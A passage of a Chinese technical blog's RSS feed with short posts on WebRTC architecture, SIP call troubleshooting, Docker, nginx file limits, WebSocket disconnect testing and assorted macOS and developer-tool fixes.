      <link>https://wdd.js.org/fe/webrtc-notes/</link>
      <pubDate>Mon, 13 Jul 2020 10:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/webrtc-notes/</guid>
      <description>&lt;h1 id=&#34;标准文档&#34;&gt;标准文档&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;WebRTC &lt;a href=&#34;https://w3c.github.io/webrtc-pc/&#34;&gt;https://w3c.github.io/webrtc-pc/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;MediaStream &lt;a href=&#34;https://www.w3.org/TR/mediacapture-streams/&#34;&gt;https://www.w3.org/TR/mediacapture-streams/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;实现接口&#34;&gt;实现接口&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;MediaStream: 获取媒体流，例如从用户的摄像机或者麦克风&lt;/li&gt;
&lt;li&gt;RTCPeerConnection: 音频或者视频呼叫，以及加密和带宽管理&lt;/li&gt;
&lt;li&gt;RTCDataChannel: 端到端的数据交互&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc架构&#34;&gt;WebRTC架构&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/webrtc-notes/2022-10-29-11-17-35.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;架构图颜色标识说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;紫色部分是Web开发者API层&lt;/li&gt;
&lt;li&gt;蓝色实线部分是面向浏览器厂商的API层&lt;/li&gt;
&lt;li&gt;蓝色虚线部分浏览器厂商可以自定义实现&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WebRTC有三个模块：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Voice Engine（音频引擎）
&lt;ul&gt;
&lt;li&gt;Voice Engine包含iSAC/iLBC Codec（音频编解码器，前者是针对宽带和超宽带，后者是针对窄带）&lt;/li&gt;
&lt;li&gt;NetEQ for voice（处理网络抖动和语音包丢失）&lt;/li&gt;
&lt;li&gt;Echo Canceler（回声消除器）/ Noise Reduction（噪声抑制）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Engine（视频引擎）
&lt;ul&gt;
&lt;li&gt;VP8 Codec（视频图像编解码器）&lt;/li&gt;
&lt;li&gt;Video jitter buffer（视频抖动缓冲器，处理视频抖动和视频信息包丢失）&lt;/li&gt;
&lt;li&gt;Image enhancements（图像质量增强）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transport
&lt;ul&gt;
&lt;li&gt;SRTP（安全的实时传输协议，用以音视频流传输）&lt;/li&gt;
&lt;li&gt;Multiplexing（多路复用）&lt;/li&gt;
&lt;li&gt;P2P，STUN+TURN+ICE（用于NAT网络和防火墙穿越的）&lt;/li&gt;
&lt;li&gt;除此之外，安全传输可能还会用到DTLS（数据报安全传输），用于加密传输和密钥协商&lt;/li&gt;
&lt;li&gt;整个WebRTC通信是基于UDP的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc底层协议&#34;&gt;WebRTC底层协议&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/webrtc-notes/2022-10-29-11-17-52.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;WebRTC 核心的协议都是在右侧基于 UDP 基础上搭建起来的。&lt;/p&gt;
&lt;p&gt;其中，ICE、STUN、TURN 用于内网穿透, 解决了获取与绑定外网映射地址，以及 keep alive 机制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DTLS 用于对传输内容进行加密，可以看做是 UDP 版的 TLS。由于 WebRTC 对安全比较重视，这一层是必须的。所有WebRTC组件都必须加密，并且其JavaScript API只能用于安全源（HTTPS或本地主机）。信令机制并不是由WebRTC标准定义的，所以您必须确保使用安全协议。&lt;/li&gt;
&lt;li&gt;SRTP 与 SRTCP 是对媒体数据的封装与传输控制协议&lt;/li&gt;
&lt;li&gt;SCTP 是流控制传输协议，提供类似 TCP 的特性，SCTP 可以基于 UDP 上构建，在 WebRTC 里是在 DTLS 协议之上&lt;/li&gt;
&lt;li&gt;RTCPeerConnection 用来建立和维护端到端连接，并提供高效的音视频流传输&lt;/li&gt;
&lt;li&gt;RTCDataChannel 用来支持端到端的任意二进制数据传输&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WebRTC 协议栈解释&lt;/p&gt;</description>
    </item>
    <item>
      <title>通话质量差</title>
      <link>https://wdd.js.org/opensips/ch7/poor-quality/</link>
      <pubDate>Wed, 08 Jul 2020 18:50:35 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/poor-quality/</guid>
      <description>&lt;p&gt;通话质量差，一般可能以下因素有关。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;媒体服务器或者媒体代理服务器CPU, 内存异常&lt;/li&gt;
&lt;li&gt;通信网络差&lt;/li&gt;
&lt;li&gt;中继或者网关送过来的本来音质就不好。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;解决思路：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这个需要监控媒体服务器或者媒体代理CPU，内存是否正常&lt;/li&gt;
&lt;li&gt;也可以在媒体代理上用tupdump抓包，然后用wireshark分析&lt;/li&gt;
&lt;li&gt;调听服务端的录音，看看服务端录音是否也存在音质差的问题&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>一方听不到另外一方的声音</title>
      <link>https://wdd.js.org/opensips/ch7/one-leg-audio/</link>
      <pubDate>Wed, 08 Jul 2020 18:49:58 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/one-leg-audio/</guid>
      <description>&lt;ol&gt;
&lt;li&gt;这个问题很大可能和和SDP没有正确修改有关。需要排查SIP信令的sdp地址是否正确。&lt;/li&gt;
&lt;li&gt;防火墙策略问题：有的网络允许udp出去，但是不允许udp进来。需要设置防火墙策略。&lt;/li&gt;
&lt;li&gt;udp端口范围太小。一般一个通话需要占用4个udp端口。如果开放的udp端口太少，在通话达到一定数量后，就会出现一部分呼叫没有可用端口。&lt;/li&gt;
&lt;li&gt;用户设备的问题。例如用户的电脑声卡或者扬声器出现问题。&lt;/li&gt;
&lt;li&gt;由于网络的复杂性，还有很多可能&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一般遇到这个问题，可以按照如下的思路排查：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务端有录音功能的，可以先在服务端听录音，看看服务端录音里是否正常。一般来说有四种情况。
&lt;ol&gt;
&lt;li&gt;两方的录音都没有&lt;/li&gt;
&lt;li&gt;主叫方有，被叫方没有&lt;/li&gt;
&lt;li&gt;被叫方有，主叫方没有&lt;/li&gt;
&lt;li&gt;主被叫都有。但是就是一方听不到另一方。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过排查服务端的录音，就可以大致知道到底是AB两个leg, 每个leg上的语音流收发的情况。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;从信令的的sdp中分析，这个需要一定的SIP协议的分析能力。有些时候，sdp里面的媒体地址不正确，也会导致媒体流无法正常首发。&lt;/li&gt;
&lt;li&gt;NAT策略。NAT一般有四种，用的比较多的是端口限制型。这种NAT要求外网流量在进入NAT内部时，必需先有内部的流量出去。当内部流量出去之后，这个NAT洞才会出现，外部的流量才能从这个洞进入。如果NAT内部设备一直不发送rtp包，那么外部的流量即使进来，也会被防火墙拦截掉。&lt;/li&gt;
&lt;li&gt;无论是运维人员还是开发人员，在遇到媒体流问题时，一定要先搞清楚整个软交换的网络拓扑架构。否则只能南辕北辙。&lt;/li&gt;
&lt;li&gt;sngrep -cr, 加上r这个参数，可以实时观察媒体流的流动情况。是个非常好的功能。但是对于那种加密的媒体流，sngrep是抓不到的，这点要注意。常见的WebRTC的媒体流就是加密的。&lt;/li&gt;
&lt;li&gt;最终如果还是解决不了，那么只能祭出最后的杀器：tcpdump + wireshark。服务端抓包的话，虽然sngrep可以抓包，但是比较浪费内存还可能会出现丢包。最好用tcpdump抓包成文件，然后在wireshark上分析。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>30秒自动挂断</title>
      <link>https://wdd.js.org/opensips/ch7/30-seconds-drop/</link>
      <pubDate>Wed, 08 Jul 2020 18:47:06 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/30-seconds-drop/</guid>
      <description>&lt;p&gt;在通话接近30秒时，呼叫自动挂断。&lt;/p&gt;
&lt;p&gt;有很大的可能和丢失了ACK有关。这个需要用sngrep去抓包看SIP时序图来确定是否是ACK丢失。&lt;/p&gt;
&lt;p&gt;丢失ACK的原因很大可能是NAT没有处理好，或者是网络协议不匹配等等。&lt;/p&gt;</description>
    </item>
    <item>
      <title>exec user process caused no such file or diectory</title>
      <link>https://wdd.js.org/posts/2020/07/docker-exec-user-process/</link>
      <pubDate>Wed, 08 Jul 2020 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/07/docker-exec-user-process/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec user process caused &amp;#34;no such file or diectory&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解决方案：
将镜像构建的 Dockerfile ENTRYPOINT [&amp;quot;/run.sh&amp;quot;] 改为下面的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ENTRYPOINT [&amp;#34;sh&amp;#34;,&amp;#34;/run.sh&amp;#34;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其实就是加了个sh&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用image标签上传日志</title>
      <link>https://wdd.js.org/posts/2020/07/koow4y/</link>
      <pubDate>Mon, 06 Jul 2020 14:55:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/07/koow4y/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;report&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;string&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Image&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`/report?log=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;report&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>ModuleNotFoundError: No module named &#39;SocketServer&#39;</title>
      <link>https://wdd.js.org/posts/2020/07/ncigfk/</link>
      <pubDate>Thu, 02 Jul 2020 15:54:42 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/07/ncigfk/</guid>
      <description>&lt;p&gt;python Flask框架报错。刚开始我只关注了这个报错，没有看到这个报错上上面还有一个报错&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ModuleNotFoundError: No module named &amp;#39;http.client&amp;#39;; &amp;#39;http&amp;#39; is not a package
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;实际上问题的关键其实是 &lt;code&gt;&#39;http&#39; is not a package&lt;/code&gt; , 为什么会有这个报错呢？&lt;/p&gt;
&lt;p&gt;其实因为我自己在项目目录里新建一个叫做http.py的文件，这个文件名和python的标准库重名了，就导致了后续的一系列的问题。&lt;/p&gt;
&lt;h1 id=&#34;问题总结&#34;&gt;问题总结&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;文件名一定不要和某些标准库的文件名相同&lt;/li&gt;
&lt;li&gt;排查问题的时候，一定要首先排查最先出现问题的点&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>iTerm2技巧 维护多个host与固定tab页面标题</title>
      <link>https://wdd.js.org/posts/2020/06/ba84a7/</link>
      <pubDate>Tue, 30 Jun 2020 13:16:05 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/ba84a7/</guid>
      <description>&lt;p&gt;iTerm我已经使用了很长时间了，总体各方面的特点都非常好，但是有几个地方也是让我苦恼的地方。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;tab 页面的标题会根据执行的命令或者路径发生变化，如果你开了七八个ssh远程，有时候很难区分这个tab页面到底是连接的哪台机器。&lt;/li&gt;
&lt;li&gt;如果你有十几个机器需要连接，你不可能手动输入ssh root@ip地址的方式去连接，太多了记不住。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;如何维护多个远程host&#34;&gt;如何维护多个远程host?&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;使用profile维护多个远程host, 每个profile对应连接到一台机器。profile name填入该host的名字。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注意右边的Command, Send text at start的输入框，这个输入框，就是要执行的ssh指令，里面包含了远程host的地址。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/ba84a7/2022-10-29-19-40-52.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后你就可以在Profils的菜单中选择一个profile进行连接了。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/ba84a7/2022-10-29-19-41-01.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;如何让tab页面的标题不改变&#34;&gt;如何让tab页面的标题不改变？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;一定不要勾选Applications in terminal may change the title,  默认这项是勾选的。&lt;/li&gt;
&lt;li&gt;Ttile一定要选择Name,&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/ba84a7/2022-10-29-19-41-12.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;badge的妙用&#34;&gt;badge的妙用？&lt;/h1&gt;
&lt;p&gt;如果标签页的tab的名称还不够强调当前tab页面是连接哪个标签页面的，你可以用用Badge去强调一下。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/ba84a7/2022-10-29-19-41-27.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/ba84a7/2022-10-29-19-41-37.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>MacOS 随航功能链接ipad超时</title>
      <link>https://wdd.js.org/posts/2020/06/yh0oty/</link>
      <pubDate>Sun, 28 Jun 2020 07:54:04 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/yh0oty/</guid>
      <description>&lt;ol&gt;
&lt;li&gt;首先去官网查看一下，macos的系统版本和硬件以及ipad的版本是否支持随航。这是前提条件。&lt;/li&gt;
&lt;li&gt;macos 和 ipad 需要登录同一个AppleID&lt;/li&gt;
&lt;li&gt;macos和iPad需要在同一个Wi-Fi下&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;遇到报错提示链接超时时：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;MacOS 退出apple账号，然后重新登录，登录完了之后重启电脑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;再次尝试连接，就可以连接成功了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>xcrun: error: invalid active developer path</title>
      <link>https://wdd.js.org/posts/2020/06/wetv3e/</link>
      <pubDate>Sat, 27 Jun 2020 11:20:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/wetv3e/</guid>
      <description>&lt;p&gt;macos 升级后，发现git等命令都不可用了。&lt;/p&gt;
&lt;p&gt;第一次使用xcode-select &amp;ndash;install, 有报错。于是就用brew 安装了git。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;xcode-select --install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;后续使用其他命令是，发现gcc命令也不可用。于是第二天又用 &lt;code&gt;xcode-select --install&lt;/code&gt; 执行了一遍，忽然又可以正常安装开发软件了。&lt;/p&gt;
&lt;p&gt;所以又把brew 安装的git给卸载了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>生产环境nginx配置</title>
      <link>https://wdd.js.org/posts/2020/06/rlmqq8/</link>
      <pubDate>Wed, 24 Jun 2020 19:36:06 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/rlmqq8/</guid>
      <description>&lt;p&gt;最近遇到一个问题，WebSocket总是会在下午出现比较大的断开的量。&lt;/p&gt;
&lt;p&gt;首先怀疑的是客户端的网络到服务端的网络出现抖动或者断开，要么就是入口的nginx有异常，或者是内部的服务出现异常。&lt;/p&gt;
&lt;p&gt;排查下来，发现nginx的最大打开文件个数是1024&lt;/p&gt;
&lt;p&gt;nginx master进程&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/rlmqq8/2022-10-29-20-32-06.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;nginx work进程&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/06/rlmqq8/2022-10-29-20-32-16.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;当进程打开文件数超过限制时会发生什么&#34;&gt;当进程打开文件数超过限制时，会发生什么？&lt;/h1&gt;
&lt;p&gt;当进程超过最大打开文件限制时，会收到SIGXFSZ信号。这个信号会默认行为会杀死一个进程。进程内部也可以捕获这个信号。&lt;/p&gt;
&lt;p&gt;我试着向nginx wrok进程发送SIGXFSZ信号, work进程会退出，然后master监听了这个事件后，会重新启动一个work进程。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kill -XFSZ work_pid
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在nginx的error.log文件中，可以看到类似的日志输出。&lt;/p&gt;
&lt;p&gt;这里的25就是XFSZ信号的整数表示。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;... [alert] ...#.: work process ... exited on signal 25 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;&lt;!-- raw HTML omitted --&gt;&lt;/em&gt;&lt;!-- raw HTML omitted --&gt;_&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.monitis.com/blog/6-best-practices-for-optimizing-your-nginx-performance/&#34;&gt;https://www.monitis.com/blog/6-best-practices-for-optimizing-your-nginx-performance/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/shansongxian/p/9989631.html&#34;&gt;https://www.cnblogs.com/shansongxian/p/9989631.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/jpfss/p/9755706.html&#34;&gt;https://www.cnblogs.com/jpfss/p/9755706.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://man7.org/linux/man-pages/man2/getrlimit.2.html&#34;&gt;https://man7.org/linux/man-pages/man2/getrlimit.2.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://man7.org/linux/man-pages/man5/proc.5.html&#34;&gt;https://man7.org/linux/man-pages/man5/proc.5.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>[未完成] WebSocket调研</title>
      <link>https://wdd.js.org/posts/2020/06/sbhglg/</link>
      <pubDate>Wed, 24 Jun 2020 11:09:02 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/sbhglg/</guid>
      <description>&lt;h1 id=&#34;调研目的&#34;&gt;调研目的&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在异常情况下，网络断开对WebSocket的影响&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;测试代码&#34;&gt;测试代码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;测试代码没有心跳机制&lt;/li&gt;
&lt;li&gt;心跳机制并不包含在WebSocket协议内部&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var ws &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new WebSocket&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wss://echo.websocket.org/&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ws.onopen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    console.log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;onopen&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ws.onerror &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  console.log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;onerror: &amp;#39;&lt;/span&gt; + e.code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  console.log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ws.onclose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  console.log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;onclose: &amp;#39;&lt;/span&gt; + e.code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  console.log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;场景1-断网后是否会立即触发onerror-或者onclose事件&#34;&gt;场景1: 断网后，是否会立即触发onerror, 或者onclose事件？&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;答案&lt;/strong&gt;：不会立即触发&lt;/p&gt;
&lt;p&gt;测试代码中没有心跳机制，断网后，并不会立即触发onerror或者onclose的回调函数。&lt;/p&gt;
&lt;p&gt;个人测试的情况&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;及其&lt;/th&gt;
          &lt;th&gt;测试场景&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Macbook pro chrome 83.0.4103.106&lt;/td&gt;
          &lt;td&gt;每隔10秒发送一次消息的情况下，40秒后出发onclose事件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Macbook pro chrome 83.0.4103.106&lt;/td&gt;
          &lt;td&gt;一直不发送消息，一直就不回出发onclose事件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Macbook pro chrome 83.0.4103.106&lt;/td&gt;
          &lt;td&gt;发出一个消息后？&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;场景2-断网后使用send发送数据回触发事件吗&#34;&gt;场景2: 断网后，使用send()发送数据，回触发事件吗？&lt;/h1&gt;
&lt;h1 id=&#34;为什么无法准确拿到断开原因&#34;&gt;为什么无法准确拿到断开原因？&lt;/h1&gt;
&lt;p&gt;WebSocket关闭事件中有三个属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;code 断开原因码&lt;/li&gt;
&lt;li&gt;reason 具体原因&lt;/li&gt;
&lt;li&gt;wasClean 是否是正常断开&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;官方文档上，code字段有很多个值。但是大多数情况下，要么拿到的值是undefined, 要么是1006，基本上没有其他情况。&lt;/p&gt;</description>
    </item>
    <item>
      <title>媒体路径与信令路径</title>
      <link>https://wdd.js.org/opensips/ch1/sip-rtp-path/</link>
      <pubDate>Wed, 24 Jun 2020 09:11:35 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-rtp-path/</guid>
      <description>&lt;p&gt;一般的sip网关同时具有信令和媒体处理的能力，如下图。&lt;/p&gt;
